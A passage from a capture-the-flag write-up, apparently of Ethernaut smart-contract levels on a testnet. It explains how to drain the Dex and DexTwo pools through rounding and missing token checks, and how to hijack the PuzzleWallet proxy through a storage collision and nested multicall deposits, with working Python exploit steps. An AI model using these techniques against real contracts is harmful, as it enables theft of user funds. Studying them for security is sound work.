sides.</p>
<h4 id="balances-at-each-swap">Balances at each swap</h4>

<table>
<thead>
<tr>
<th>Swap</th>
<th>Balance <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></th>
<th>Balance <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></th>
<th>Floor of <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>e</mi><mi>t</mi><mi>S</mi><mi>w</mi><mi>a</mi><mi>p</mi><mi>P</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>T</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>T</mi><mi>k</mi></msub><mo separator="true">,</mo><mn>10</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">getSwapPrice(T_n, T_k, 10)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span style="margin-right: 0.03588em;" class="mord mathnormal">g</span><span class="mord mathnormal">e</span><span style="margin-right: 0.02691em;" class="mord mathnormal">tSw</span><span class="mord mathnormal">a</span><span style="margin-right: 0.13889em;" class="mord mathnormal">pP</span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ce</span><span class="mopen">(</span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span style="margin-right: 0.03148em;" class="mord mathnormal mtight">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord">10</span><span class="mclose">)</span></span></span></span></span></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>100</td>
<td>100</td>
<td>10</td>
</tr>
<tr>
<td>1</td>
<td>110</td>
<td>90</td>
<td>12</td>
</tr>
<tr>
<td>2</td>
<td>98</td>
<td>100</td>
<td>10</td>
</tr>
<tr>
<td>3</td>
<td>110</td>
<td>88</td>
<td>12</td>
</tr>
<tr>
<td>4</td>
<td>83</td>
<td>110</td>
<td>13</td>
</tr>
<tr>
<td>5</td>
<td>110</td>
<td>75</td>
<td>14</td>
</tr>
<tr>
<td>6</td>
<td>59</td>
<td>110</td>
<td>18</td>
</tr>
<tr>
<td>7</td>
<td>110</td>
<td>15</td>
<td>7</td>
</tr>
<tr>
<td>8</td>
<td>0</td>
<td>30</td>
<td>Inf</td>
</tr>
</tbody>
</table><p>Even though I used the floor of the price, solidity will still apparently internally use decimals prior to casting to integer. As a result of this, swap 8 will cause the pool to be drained, as <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7.</mn><mover accent="true"><mn>3</mn><mo>ˉ</mo></mover><mo>∗</mo><mn>15</mn><mo>=</mo><mn>110</mn></mrow><annotation encoding="application/x-tex">7.\bar{3} * 15 = 110</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.78122em; vertical-align: 0em;"></span><span class="mord">7.</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.78122em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord">3</span></span><span class="" style="top: -3.21344em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">15</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">110</span></span></span></span></span>.</p>
<h3 id="how-i-did-it-20">How I did it</h3>
<ol>
<li>First call the <code>approve()</code> function in the Dex contract:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># use the convenient approve method in dex</span>
dex<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>dex<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>0x3a7d2248b69cd0cc34fa41e32c8b27ee9d20c9c59129d7c68c5530b29e70845f</p>
<ol start="2">
<li>Then I perform enough swaps until the pool is drained, which I do inside an infinite while loop that breaks when the condition that at least one of the balances of a token in the Dex is drained. The following if-else statement performs each swap, all the swaps except the last one using as the amount my balance of each token per swap (alternates through the boolean <code>c</code> which is used to index this dictionary <code>switch = {True: {1: tk1, 2: tk2}, False: {1: tk2, 2: tk1}}</code>):</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># perform action</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>my_bal <span class="token operator">&lt;</span> dex_bal1<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dex<span class="token punctuation">.</span>swap<span class="token punctuation">(</span>switch<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> switch<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> my_bal<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    dex<span class="token punctuation">.</span>swap<span class="token punctuation">(</span>switch<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> switch<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dex_bal1<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>

<span class="token comment"># check if we are done</span>
<span class="token keyword">if</span> dex_bal1<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> dex_bal2<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">break</span>
</code></pre>
<p>Table with the swaps and tx hashes:</p>

<table>
<thead>
<tr>
<th>Swap</th>
<th>Balance <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></th>
<th>Balance <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.83333em; vertical-align: -0.15em;"></span><span class="mord"><span style="margin-right: 0.13889em;" class="mord mathnormal">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: -0.13889em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span></th>
<th>Tx hash of each one of the swaps</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>100</td>
<td>100</td>
<td><a href="https://rinkeby.etherscan.io/tx/0xded5a80cd702d0f330f0acdda86248b0622a9c05d59a3fb7d7ef8abd1e2fdc12">0xded5a80cd702d0f330f0acdda86248b0622a9c05d59a3fb7d7ef8abd1e2fdc12</a></td>
</tr>
<tr>
<td>1</td>
<td>110</td>
<td>90</td>
<td><a href="https://rinkeby.etherscan.io/tx/0xa1b979e946ea9e75ec484309773d11f9c1dba0e5a7894a421a3fdfb3401a2428">0xa1b979e946ea9e75ec484309773d11f9c1dba0e5a7894a421a3fdfb3401a2428</a></td>
</tr>
<tr>
<td>2</td>
<td>98</td>
<td>100</td>
<td><a href="https://rinkeby.etherscan.io/tx/0xdfccc83437533c5a142583426a858f7cdf1bee830548523222f353c86775a31e">0xdfccc83437533c5a142583426a858f7cdf1bee830548523222f353c86775a31e</a></td>
</tr>
<tr>
<td>3</td>
<td>110</td>
<td>88</td>
<td><a href="https://rinkeby.etherscan.io/tx/0x60703c7c78c142f8ad9e9279b7a4a1478d5d48715220d8775f9dfebe5343b7e1">0x60703c7c78c142f8ad9e9279b7a4a1478d5d48715220d8775f9dfebe5343b7e1</a></td>
</tr>
<tr>
<td>4</td>
<td>83</td>
<td>110</td>
<td><a href="https://rinkeby.etherscan.io/tx/0xe08e68d42b49de0aecef4df9a94e6fd3ad93389155735a896f347e20e84593df">0xe08e68d42b49de0aecef4df9a94e6fd3ad93389155735a896f347e20e84593df</a></td>
</tr>
<tr>
<td>5</td>
<td>110</td>
<td>75</td>
<td><a href="https://rinkeby.etherscan.io/tx/0x5be83195ec1369e34cc05c7b097e15611ef9e8a8d4a00f8a3e97f829e7ff148c">0x5be83195ec1369e34cc05c7b097e15611ef9e8a8d4a00f8a3e97f829e7ff148c</a></td>
</tr>
<tr>
<td>6</td>
<td>59</td>
<td>110</td>
<td><a href="https://rinkeby.etherscan.io/tx/0x44b5e1ff748c05acdf87128d7b68af188cb76e47a226744568c246e36b352773">0x44b5e1ff748c05acdf87128d7b68af188cb76e47a226744568c246e36b352773</a></td>
</tr>
<tr>
<td>7</td>
<td>110</td>
<td>15</td>
<td><a href="https://rinkeby.etherscan.io/tx/0xaf0676991ff5583ac68e13197df00b7e0bfa1796f7769519721c8bff8e72ced8">0xaf0676991ff5583ac68e13197df00b7e0bfa1796f7769519721c8bff8e72ced8</a></td>
</tr>
<tr>
<td>8</td>
<td>0</td>
<td>30</td>
<td>Pool is drained at this point</td>
</tr>
</tbody>
</table><ol start="3">
<li>Once the loop breaks, I confirm that I have actually drained at least one side of the pool:</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># check that we have effectively drained at least one of the tokens</span>
balance_assertion <span class="token operator">=</span> <span class="token punctuation">(</span>dex_bal1<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token punctuation">(</span>dex_bal2<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Token1 balance: {dex_bal1(True)}"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Token2 balance: {dex_bal2(True)}"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"at least one side is drained: {balance_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-21">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xb05ba7ef00bcc01183a48d47c3bc8e67d81eeafcc02309676ad00ded8abfd69f">https://rinkeby.etherscan.io/tx/0xb05ba7ef00bcc01183a48d47c3bc8e67d81eeafcc02309676ad00ded8abfd69f</a></p>
<hr>
<h2 id="dex-two">Dex Two</h2>
<h3 id="objectives-21">Objectives</h3>
<p>You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.</p>
<h3 id="solution-21">Solution</h3>
<p>The DexTwo problem suffers from a different problem to the Dex problem. In this case, there is no require statement checking whether the two token contract addresses being swapped actually match the two token contract addresses for which the pool is designed. As correctly defined in the Dex contract, this line is missing:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>As a result of this, we can code another ERC20 token contract of which we mint the entire supply to our wallet and with just a few of these we can drain both sides of the pool as follows:</p>
<ol>
<li>
<p>Create a new ERC20 token and mint the entire supply to our wallet. As defined in the SwappableTokenTwo contract or otherwise.</p>
</li>
<li>
<p>Send a few of those tokens to the DexTwo contract.</p>
</li>
<li>
<p>Approve the DexTwo contract for spending our new token.</p>
</li>
<li>
<p>Transfer some of the new tokens to the contract, so that the contract can compute the internal ratio in it of the tokens using the same flawed <code>getSwapAmount()</code> function.</p>
</li>
<li>
<p>Perform 2 swaps, one to drain the balance of Token 1 and another one to drain the balance of Token 2 by swapping of our Token 3 (the new token) for them.</p>
</li>
<li>
<p>Because we can control the internal ratio and we can perform swaps with zero checks of whether the address is the correct one or not, the pool can be easily drained.</p>
</li>
</ol>
<h3 id="how-i-did-it-21">How I did it</h3>
<p>Exactly as described in <a href="#solution-21">solution</a>.</p>
<ol>
<li>Code and deploy a new ERC20 token (at: <code>0xc27a45c6D84F6AB7aAFECFB82d0853064e288261</code>)</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">dextwoattack <span class="token operator">=</span> DexTwoAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span><span class="token string">'token3'</span><span class="token punctuation">,</span> <span class="token string">'TK3'</span><span class="token punctuation">,</span> <span class="token string">'10000000000000'</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<ol start="2">
<li>Approve the DexTwo contract spending limit for our new token</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">dextwoattack<span class="token punctuation">.</span>approve<span class="token punctuation">(</span>dextwo<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x8a25d4bcb33d461f536192aecc1a3137ba17293341ce2235c958c5b3d675e1bf">https://rinkeby.etherscan.io/tx/0x8a25d4bcb33d461f536192aecc1a3137ba17293341ce2235c958c5b3d675e1bf</a></p>
<ol start="3">
<li>Transfer some of the new tokens to the DexTwo contract</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">dextwoattack<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>dextwo<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xd2a9c745602a8b5f87117939d22133e877657ff030e6eeb0258260bdd47a072c">https://rinkeby.etherscan.io/tx/0xd2a9c745602a8b5f87117939d22133e877657ff030e6eeb0258260bdd47a072c</a></p>
<ol start="4">
<li>Perform both swaps, one to drain the balance of Token 1 and the other one to drain the balance of Token 2</li>
</ol>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x9a8a5397aed89c3fb0570c293f3465af37ebc658c5a1e241891774e749bb083c">https://rinkeby.etherscan.io/tx/0x9a8a5397aed89c3fb0570c293f3465af37ebc658c5a1e241891774e749bb083c</a></p>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x8f1434586d9cbfb6774c8be95c3e8a2b538c3c09ee0a3b6978daff585898bded">https://rinkeby.etherscan.io/tx/0x8f1434586d9cbfb6774c8be95c3e8a2b538c3c09ee0a3b6978daff585898bded</a></p>
<ol start="5">
<li>Check whether we have successfully drained the pools or not</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># check the balances</span>
balanceTK1 <span class="token operator">=</span> dextwo<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>tk1<span class="token punctuation">,</span> dextwo<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
balanceTK2 <span class="token operator">=</span> dextwo<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>tk2<span class="token punctuation">,</span> dextwo<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The pool balances are: TK1: {balanceTK1}, TK2: {balanceTK2}"</span><span class="token punctuation">)</span>

<span class="token comment"># the pools have been drained</span>
balance_assertion <span class="token operator">=</span> balanceTK1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> balanceTK2 <span class="token operator">==</span> <span class="token number">0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"The pools have been drained: {balance_assertion}"</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="submission-transaction-22">Submission transaction</h3>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x2ad048ca0de3d4f6c1bdd78862d202dad7a7d68bd9ed87fc0ea98a511efd205c">https://rinkeby.etherscan.io/tx/0x2ad048ca0de3d4f6c1bdd78862d202dad7a7d68bd9ed87fc0ea98a511efd205c</a></p>
<hr>
<h2 id="puzzlewallet">PuzzleWallet</h2>
<h3 id="objectives-22">Objectives</h3>
<p>You’ll need to hijack this wallet to become the admin of the proxy.</p>
<h3 id="solution-22">Solution</h3>
<p>The state variable layout of the PuzzleProxy contract and the PuzzleWallet contract is as follows:</p>

<table>
<thead>
<tr>
<th>Storage slot</th>
<th>PuzzleProxy</th>
<th>PuzzleWallet</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>pendingAdmin</td>
<td>owner</td>
</tr>
<tr>
<td>1</td>
<td>admin</td>
<td>maxBalance</td>
</tr>
</tbody>
</table><p>But as we know from the utility of proxies, the objective of proxies is to contain storage to allow contract implementations (logic contract) to be upgraded without having to replace contract storage in every upgrade. There’s a problem with this storage layout, as there’s state variables that some functions in PuzzleWallet modify like <code>setMaxBalance()</code>, the variables that PuzzleWallet will end up modifying through delegatecalls are the variables in PuzzleProxy.</p>
<p>If the developers intended PuzzleWallet variables like <code>owner</code> and <code>maxBalance</code> to have their own slot, they should have replicated the same storage layout in PuzzleProxy first and then add any additional variables in order to avoid storage collisions.</p>
<p>Therefore, we can follow these steps to become <code>admin</code>:</p>
<ol>
<li>Call <code>proposeNewAdmin()</code> on PuzzleProxy passing your address as <code>_newAdmin</code> in order to become <code>owner</code>, as <code>owner</code> is also <code>pendingAdmin</code> because of the storage collision</li>
</ol>
<p><strong>All subsequent steps past this point must be done through he proxy contract’s fallback function which passes all calls to the PuzzleWallet contract using <code>delegatecall</code>. To do this, just perform a normal transaction with some encoded data pertaining to the function calls and inputs.</strong></p>
<ol start="2">
<li>
<p>Become whitelisted by calling <code>addToWhitelist()</code> passing your address as <code>addr</code> in order to pass the <code>onlyWhitelisted</code> modifier check.</p>
</li>
<li>
<p>Create a transaction data bundle in order to call <code>multicall()</code>. The bundle should consist of two deposit transactions. However, the code doesn’t allow for this, instead, the bundle should consist of a multicall bundle with the tx data for a <code>deposit()</code> call and a <code>multicall()</code> containing a <code>deposit()</code> call. Because the transaction is nested, this second <code>multicall()</code> that calls <code>deposit()</code> will not detect that we are calling deposit twice in a row.</p>
</li>
<li>
<p>Because we called <code>deposit()</code> twice but our tx value in that single tx was 0.001 ether, even though you only deposit 0.001 ether once, it still sums 0.001 ether twice to your address’ balance in the <code>balance</code> mapping.</p>
</li>
<li>
<p>Now that your balance in the <code>balance</code> mapping is of 0.002 ether, you’re able to withdraw the entire contract balance. To do so, call <code>execute()</code> with the entire contract balance in the <code>value</code> parameter of the function.</p>
</li>
<li>
<p>After draining the contract, you can now call <code>setMaxBalance()</code> by passing in your address casted as an integer, which will make <code>maxBalance</code> and therefore <code>admin</code> your address.</p>
</li>
</ol>
<h3 id="how-i-did-it-22">How I did it</h3>
<p>As described in <a href="#solution-22">solution</a>, but with a few resourceful changes in order to simplify the python code.</p>
<ol>
<li>Get the position in the proxy contract’s storage which contains the address of the implementation contract. I do this in order to be able to encode the calls to certain methods in this contract, which I could technically do manually by constructing a short JSON and encoding it as ABI, but using the contract code instance is easier. I think it’s also possible to deploy an instance of the PuzzleWallet contract in order to do it.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">storage_position_impl_address <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>sha3<span class="token punctuation">(</span>text<span class="token operator">=</span><span class="token string">'eip1967.proxy.implementation'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
implementation_address <span class="token operator">=</span> f<span class="token string">'0x{web3.eth.get_storage_at(puzzleproxy.address, storage_position_impl_address).hex()[-40:]}'</span>
</code></pre>
<ol start="2">
<li>Get the PuzzleWallet contract instance and assign it to an object in python in order to encode the contract calls that will be passed to the proxy contract through the tx data.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">puzzlewallet <span class="token operator">=</span> PuzzleWallet<span class="token punctuation">.</span>at<span class="token punctuation">(</span>implementation_address<span class="token punctuation">)</span>
</code></pre>
<ol start="3">
<li>Call <code>proposeNewAdmin()</code> to become <code>pendingAdmin</code></li>
</ol>
<pre class=" language-python"><code class="prism  language-python">puzzleproxy<span class="token punctuation">.</span>proposeNewAdmin<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xbd43b12ff9139f8e9916c46f7e2df7128c34bf6419130c2992d656d7df7453a1">https://rinkeby.etherscan.io/tx/0xbd43b12ff9139f8e9916c46f7e2df7128c34bf6419130c2992d656d7df7453a1</a></p>
<p>Every single step after this one will perform a tx that sends tx data to the proxy contract in order to perform the delegate calls to the PuzzleWallet contract.</p>
<ol start="4">
<li>Call the <code>addToWhitelist()</code> function in order to whitelist my address</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">whitelist_address_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>addToWhitelist<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>to<span class="token operator">=</span>puzzleproxy<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token operator">=</span>whitelist_address_data<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5">https://rinkeby.etherscan.io/tx/0xfbc79616c75d96e8a0d176b88197521a18b688bfc6286f01fb904335300c56c5</a></p>
<ol start="5">
<li>Create the multicall bundled transaction and call <code>multicall()</code> as specified in <a href="#solution-22">solution</a> step 3.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># multicall tx data</span>
deposit_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>deposit<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
multicall_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>multicall<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">[</span>deposit_data<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment"># nest the call</span>
multicall_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>multicall<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span><span class="token punctuation">[</span>deposit_data<span class="token punctuation">,</span> multicall_data<span class="token punctuation">]</span><span class="token punctuation">)</span> 
acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>to<span class="token operator">=</span>puzzleproxy<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token operator">=</span>puzzleproxy<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>multicall_data<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0x6e33c31f232cfb459d4bbd13f296a52be0606c680bde05732fd207f06306d205">https://rinkeby.etherscan.io/tx/0x6e33c31f232cfb459d4bbd13f296a52be0606c680bde05732fd207f06306d205</a></p>
<ol start="6">
<li>Perform the withdrawal of all contract’s funds by calling <code>execute()</code>.</li>
</ol>
<pre class=" language-python"><code class="prism  language-python">execute_data <span class="token operator">=</span> puzzlewallet<span class="token punctuation">.</span>execute<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> puzzleproxy<span class="token punctuation">.</span>balance<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
acc<span class="token punctuation">.</span>transfer<span class="token punctuation">(</span>to<span class="token operator">=</span>puzzleproxy<span class="token punctuation">.</span>address<span class="token punctuation">,</span> amount<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token operator">=</span>execute_data<span class="token punctuation">)</span>
</code></pre>
<p>Block explorer: <a href="https://rinkeby.etherscan.io/tx/0xc856e1a011cc5405e67956a40ea59754342b41002ff860eeeb21b4b4ee949b97">https://rinkeby.etherscan.io/tx/0xc856e1a011cc5405e67956a40ea59754342b41002ff860eeeb21b4b4ee949b97</a></p>
<ol start="7">
<li>Call <code>setMaxBalance()</code> in order to become <code>admin</code></li>
</ol>
